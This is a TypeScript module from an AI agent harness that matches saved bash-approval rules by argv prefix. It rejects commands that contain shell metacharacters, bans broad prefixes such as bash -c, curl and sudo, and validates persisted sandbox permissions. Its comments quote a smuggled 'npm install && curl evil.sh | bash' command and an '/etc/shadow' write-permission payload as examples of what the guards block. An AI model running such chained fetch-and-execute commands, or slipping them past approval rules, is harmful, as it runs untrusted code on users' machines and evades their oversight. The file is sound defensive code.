import {
  CommandApprovalRuleRepository,
  type CommandApprovalRule,
} from "../../repositories/command-approval-rule-repository";

/**
 * Spec §1 — argv-prefix matching for bash approval
 * rules. When the model issues a `bash` tool call with
 * `sandbox_permissions: "require_escalated"`, the decision pipeline
 * consults persistent rules BEFORE asking the user. A rule with
 * `pattern_kind: "argv_prefix", pattern_json: ["npm","install"]`
 * matches any command whose tokenized argv starts with
 * ["npm", "install", ...].
 *
 * Safety guard — shell metacharacters disqualify the match. After
 * a user approved `["npm","install"]`, we MUST NOT auto-allow
 * `npm install && curl evil.sh | bash` simply because the prefix
 * matches. The presence of any pipe / redirect / && / || / ; /
 * $() / backtick puts the command into "request approval per-call"
 * even when a prefix would otherwise match.
 *
 * V2: extend to path_glob (write_file) and literal (exact-match
 * trusted commands) per spec §1.13.
 */

/**
 * Conservative shell-metachar detector. Matches:
 *   |, &, &&, ||, ;, $(, `, > , < , <<, <<<, >>, <(...), >(...)
 * Excluded: `>=`, `<=`, `<>`, `&` inside quoted strings (rare in
 * shell argv form; the argv parser strips quotes for us, so a
 * literal `>=` lands as one token without the `>` showing up
 * outside quoted contexts).
 *
 * We test the RAW command string (not the parsed tokens) because
 * shell tokenizers strip metachars from output. A `$(...)`
 * substitution becomes a single token with the `$` and parens
 * gone — losing the very thing we're trying to detect.
 *
 * Two-pass detection: first the easy cases (pipe, &, &&, ;,
 * $(, backtick), then redirects (>, <, including <<, <<<, >>),
 * and finally process substitution `<(...)` / `>(...)`.
 *
 * Codex review #2 (2026-05-17): pre-fix this missed `<<` heredoc
 * and `<<<` here-string forms; `npm install <<< "input"` would
 * have been allowed under a `["npm","install"]` rule.
 */
const SHELL_METACHAR_RE = /[|&;`]|\$\(|<\(|>\(|<<<|<<|>>|(?:^|[^<>=])[<>](?:[^<>=]|$)/;

export function hasShellMetacharacters(command: string): boolean {
  return SHELL_METACHAR_RE.test(command);
}

/**
 * Banned overly-broad prefixes. Rejected at rule-creation time
 * (server-side validator) so the persistent store never carries
 * a `["python"]` or `["bash","-c"]` rule that would auto-approve
 * arbitrary scripting. Mirrors the Codex prefix_rule banned list
 * with Magister-specific additions.
 */
const BANNED_PREFIXES: ReadonlySet<string> = new Set([
  // Single-token interpreters — any script passes
  JSON.stringify(["python"]),
  JSON.stringify(["python3"]),
  JSON.stringify(["node"]),
  JSON.stringify(["bash"]),
  JSON.stringify(["sh"]),
  JSON.stringify(["zsh"]),
  JSON.stringify(["ruby"]),
  JSON.stringify(["perl"]),
  // Single-token privilege escalation
  JSON.stringify(["sudo"]),
  JSON.stringify(["doas"]),
  JSON.stringify(["su"]),
  // Single-token destructive actions
  JSON.stringify(["rm"]),
  JSON.stringify(["curl"]),
  JSON.stringify(["wget"]),
  JSON.stringify(["chmod"]),
  JSON.stringify(["chown"]),
  // Shell-eval forms
  JSON.stringify(["python", "-c"]),
  JSON.stringify(["python", "-"]),
  JSON.stringify(["python3", "-c"]),
  JSON.stringify(["bash", "-c"]),
  JSON.stringify(["bash", "-lc"]),
  JSON.stringify(["sh", "-c"]),
  JSON.stringify(["zsh", "-c"]),
  JSON.stringify(["node", "-e"]),
  JSON.stringify(["ruby", "-e"]),
  JSON.stringify(["perl", "-e"]),
]);

export function validatePrefixRule(prefix: readonly string[]): string | null {
  if (!Array.isArray(prefix) || prefix.length === 0) {
    return "prefix_rule must be a non-empty array";
  }
  if (prefix.some((tok) => typeof tok !== "string" || tok.length === 0)) {
    return "prefix_rule tokens must be non-empty strings";
  }
  if (prefix.length < 2) {
    return "prefix_rule must have ≥2 tokens (single-token prefixes are too broad)";
  }
  if (BANNED_PREFIXES.has(JSON.stringify(prefix))) {
    return `prefix_rule "${prefix.join(" ")}" is on the banned list — pick a more specific prefix or request per-call approval instead`;
  }
  return null;
}

/**
 * Sandbox-elevation v4.3 §4.9 (codex final review HIGH item #3) —
 * structural validation of persisted additional_permissions JSON.
 *
 * Returns the validated AdditionalPermissionProfile, or undefined if
 * the payload doesn't match the expected shape. Caller treats
 * undefined as "rule matches via prefix only; no auto-binds applied".
 *
 * Validations:
 *   - Top-level must be plain object
 *   - network (if present) must be { enabled?: boolean }
 *   - file_system (if present) must be { entries: [{path, access}] }
 *   - Each entry's path must be absolute string (no glob, no `..`, no `~`)
 *   - Each entry's access must be exactly "read" or "write"
 *   - Path char whitelist (no \n, \r, \0, control chars) and length <= 4096
 */
function validatePersistedAdditionalPermissions(
  parsed: unknown,
): { network?: { enabled?: boolean }; file_system?: { entries: Array<{ path: string; access: "read" | "write" }> } } | undefined {
  if (!parsed || typeof parsed !== "object" || Array.isArray(parsed)) return undefined;
  const obj = parsed as Record<string, unknown>;
  const out: { network?: { enabled?: boolean }; file_system?: { entries: Array<{ path: string; access: "read" | "write" }> } } = {};

  // network
  if ("network" in obj) {
    const network = obj.network;
    if (!network || typeof network !== "object" || Array.isArray(network)) return undefined;
    const nObj = network as Record<string, unknown>;
    if ("enabled" in nObj && typeof nObj.enabled !== "boolean") return undefined;
    out.network = typeof nObj.enabled === "boolean" ? { enabled: nObj.enabled } : {};
  }

  // file_system
  if ("file_system" in obj) {
    const fs = obj.file_system;
    if (!fs || typeof fs !== "object" || Array.isArray(fs)) return undefined;
    const fsObj = fs as Record<string, unknown>;
    if (!Array.isArray(fsObj.entries)) return undefined;
    const validatedEntries: Array<{ path: string; access: "read" | "write" }> = [];
    for (const entry of fsObj.entries) {
      if (!entry || typeof entry !== "object") return undefined;
      const e = entry as Record<string, unknown>;
      if (typeof e.path !== "string" || e.path.length === 0) return undefined;
      if (e.path.length > 4096) return undefined;
      if (/[\x00-\x1F\x7F-\x9F]/.test(e.path)) return undefined;
      if (/[*?[\]{}]/.test(e.path)) return undefined;
      if (!e.path.startsWith("/")) return undefined;
      if (e.path.includes("/../") || e.path.endsWith("/..")) return undefined;
      if (e.access !== "read" && e.access !== "write") return undefined;
      validatedEntries.push({ path: e.path, access: e.access });
    }
    out.file_system = { entries: validatedEntries };
  }

  // Reject if both fields are missing — that's an empty (useless) payload
  if (!out.network && !out.file_system) return undefined;
  return out;
}

export type MatchedRule = {
  rule: CommandApprovalRule;
  prefix: readonly string[];
  /**
   * Sandbox-elevation v4.3 §4.9 (codex Slice-3 review BLOCKER Q3c) —
   * the persisted AdditionalPermissionProfile, if the rule carried
   * one. Bash dispatcher applies these as extraBinds without
   * prompting since the user already approved this exact profile
   * when persisting the rule. JSON-parsed and shape-validated here
   * (defense in depth — a corrupted row never reaches the sandbox
   * builder).
   */
  additionalPermissions?: {
    network?: { enabled?: boolean };
    file_system?: { entries: Array<{ path: string; access: "read" | "write" }> };
  };
};

/**
 * Lightweight argv tokenizer — splits on whitespace, strips surrounding
 * single/double quotes so `--message="hello world"` tokenizes to
 * `--message=hello world` (one token, no quote chars). No escape /
 * heredoc / nested-subshell handling — the metachar guard above
 * already rejects commands that need a real parser.
 */
function tokenizeArgv(command: string): string[] {
  const out: string[] = [];
  let cur = "";
  let quote: '"' | "'" | null = null;
  for (let i = 0; i < command.length; i += 1) {
    const ch = command[i]!;
    if (quote) {
      if (ch === quote) {
        quote = null;
      } else {
        cur += ch;
      }
      continue;
    }
    if (ch === '"' || ch === "'") {
      quote = ch;
      continue;
    }
    if (/\s/.test(ch)) {
      if (cur) {
        out.push(cur);
        cur = "";
      }
      continue;
    }
    cur += ch;
  }
  if (cur) out.push(cur);
  return out;
}

/**
 * Tokenize a shell command and check if its argv prefix matches the
 * rule's pattern. Returns false on shell-metachar presence (safety
 * guard) so a rule like `["npm","install"]` doesn't auto-approve
 * `npm install && curl evil.sh | bash`.
 */
export function matchArgvPrefix(command: string, prefix: readonly string[]): boolean {
  if (hasShellMetacharacters(command)) return false;
  const tokens = tokenizeArgv(command);
  if (tokens.length < prefix.length) return false;
  for (let i = 0; i < prefix.length; i += 1) {
    if (tokens[i] !== prefix[i]) return false;
  }
  return true;
}

/**
 * Walk all enabled, non-expired rules for (tool, projectPath) and
 * return the first match. Bumps the matched rule's hit_count + last_hit_at
 * fire-and-forget (errors swallowed so the dispatch path can't get
 * blocked by a telemetry write failure).
 */
export async function matchPersistentRule(
  tool: string,
  input: Record<string, unknown>,
  projectPath: string | null,
  repo: CommandApprovalRuleRepository = new CommandApprovalRuleRepository(),
): Promise<MatchedRule | null> {
  const candidates = await repo.listCandidatesForLookup(tool, projectPath);
  for (const rule of candidates) {
    if (rule.patternKind === "argv_prefix" && tool === "bash") {
      // Codex review #5 (2026-05-17): validate shape before matching.
      // A malformed `patternJson` (e.g. `{}` instead of `[...]`) would
      // previously cast to `string[]` and `prefix.length` would be
      // `undefined`, causing `matchArgvPrefix`'s `tokens.length <
      // prefix.length` guard to evaluate `< undefined` (always false)
      // and the for-loop to never run — returning true for any
      // command. Hard-reject any row that doesn't shape-check.
      let parsed: unknown;
      try {
        parsed = JSON.parse(rule.patternJson);
      } catch {
        continue;
      }
      if (!Array.isArray(parsed)) continue;
      if (!parsed.every((t): t is string => typeof t === "string" && t.length > 0)) {
        continue;
      }
      const prefix = parsed;
      // Defense in depth: also re-run validatePrefixRule so a row
      // that somehow bypassed creation-time validation (manual SQL
      // insert, schema migration drift) can't fire either.
      if (validatePrefixRule(prefix) !== null) continue;
      const command = typeof input.command === "string" ? input.command : "";
      if (matchArgvPrefix(command, prefix)) {
        void repo.bumpHit(rule.id).catch(() => {
          // Hit-count bump is best-effort telemetry.
        });
        // Sandbox-elevation v4.3 §4.9 — parse + STRUCTURALLY VALIDATE
        // (codex final review HIGH Q3 fix) the persisted
        // additional_permissions_json. Corrupted rows (bad JSON, wrong
        // shape, exceeds 8KiB cap) are returned WITHOUT the
        // additionalPermissions field — the rule still matches but the
        // dispatcher won't blindly trust unparseable data.
        //
        // Structural validation is MANDATORY here: the bash dispatcher
        // reads `additionalPermissions.file_system.entries` directly
        // and feeds to the sandbox builder. A malformed persisted
        // payload (e.g. `{file_system:{entries:[{path:"/etc/shadow",
        // access:"write"}]}}` injected via SQL or a bug elsewhere)
        // would land that path in extraBinds before classify re-check.
        // The sandbox-builder re-classify (§4.4) catches it, but we
        // reject earlier to fail-fast on corrupt data.
        const apJson = (rule as CommandApprovalRule & { additionalPermissionsJson?: string | null }).additionalPermissionsJson;
        let additionalPermissions: MatchedRule["additionalPermissions"] | undefined;
        if (apJson && apJson.length > 0 && apJson.length <= 8192) {
          try {
            const parsedAp = JSON.parse(apJson);
            additionalPermissions = validatePersistedAdditionalPermissions(parsedAp);
          } catch {
            // Corrupt JSON — skip; rule still matches via prefix
          }
        }
        return additionalPermissions
          ? { rule, prefix, additionalPermissions }
          : { rule, prefix };
      }
    }
    // V2: pattern_kind === "path_glob" for write_file
    // V2: pattern_kind === "literal" for exact-match trusted commands
  }
  return null;
}
